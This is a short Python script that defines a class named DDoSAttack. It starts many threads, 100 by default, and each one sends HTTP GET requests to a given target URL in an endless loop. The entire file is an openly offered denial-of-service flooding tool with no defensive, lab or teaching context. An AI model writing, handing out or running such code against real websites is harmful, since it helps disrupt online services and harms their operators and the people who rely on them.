import threading
import requests

class DDoSAttack:
    def __init__(self, target_url, threads=100):
        self.target_url = target_url
        self.threads = threads

    def attack(self):
        def send_request():
            try:
                while True:
                    response = requests.get(self.target_url)
                    if response.status_code == 200:
                        print(f"Sent request to {self.target_url}")
                    else:
                        print(f"Error in response from {self.target_url}")
            except requests.RequestException as e:
                print(f"Error during DDoS attack: {e}")

        for _ in range(self.threads):
            threading.Thread(target=send_request).start()
